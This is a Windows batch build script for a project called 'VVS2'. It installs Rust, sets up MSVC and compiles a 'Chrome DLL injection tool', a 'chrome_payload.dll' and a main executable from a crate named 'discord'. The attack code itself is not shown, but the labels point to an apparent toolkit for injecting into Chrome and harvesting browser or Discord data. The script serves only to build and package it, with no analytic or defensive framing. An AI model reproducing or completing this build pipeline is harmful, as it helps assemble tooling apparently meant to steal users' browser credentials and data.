@echo off
setlocal enabledelayedexpansion

echo.
echo ============================================================
echo   VVS2 - Auto Setup + Build
echo ============================================================
echo.

set "PATH=%USERPROFILE%\.cargo\bin;%PATH%"

call :ensure_rust
if errorlevel 1 exit /b 1

call :ensure_msvc
if errorlevel 1 exit /b 1

call :do_build
if errorlevel 1 exit /b 1

echo.
echo [OK] Build complete - release\
echo     chrome-recovery.exe  (Chrome DLL injection tool)
echo     chrome_payload.dll
echo     vvs.exe              (main)
echo.
pause
exit /b 0

:ensure_rust
where rustc >nul 2>&1
if not errorlevel 1 (
    echo [OK] Rust found
    exit /b 0
)
echo [*] Downloading Rust...
curl -fsSL -o "%TEMP%\rustup-init.exe" https://win.rustup.rs/x86_64
"%TEMP%\rustup-init.exe" -y --default-toolchain stable
set "PATH=%USERPROFILE%\.cargo\bin;%PATH%"
where rustc >nul 2>&1 || (echo [X] Rust install failed & pause & exit /b 1)
exit /b 0

:ensure_msvc
call :find_vcvars
if defined VCVARS (
    call "!VCVARS!" >nul 2>&1
    echo [OK] MSVC ready
    exit /b 0
)
where link >nul 2>&1 && exit /b 0
echo [X] Install Visual C++ Build Tools first
echo     https://visualstudio.microsoft.com/visual-cpp-build-tools/
pause
exit /b 1

:find_vcvars
set "VCVARS="
for %%E in (BuildTools Community Professional Enterprise) do (
    if exist "C:\Program Files\Microsoft Visual Studio\2022\%%E\VC\Auxiliary\Build\vcvars64.bat" (
        set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\%%E\VC\Auxiliary\Build\vcvars64.bat"
    )
)
exit /b 0

:do_build
cd /d "%~dp0"

echo [*] Building chrome_payload.dll...
cargo build --release -p chrome-payload || goto build_fail

echo [*] Building chrome-recovery.exe...
cargo build --release -p chrome-recovery || goto build_fail

echo [*] Building vvs.exe...
cargo build --release -p discord || goto build_fail

if not exist release mkdir release
copy /Y "target\release\chrome-recovery.exe" "release\" >nul
copy /Y "target\release\chrome_payload.dll" "release\" >nul
copy /Y "target\release\vvs.exe" "release\" >nul
exit /b 0

:build_fail
echo [X] Build failed
pause
exit /b 1
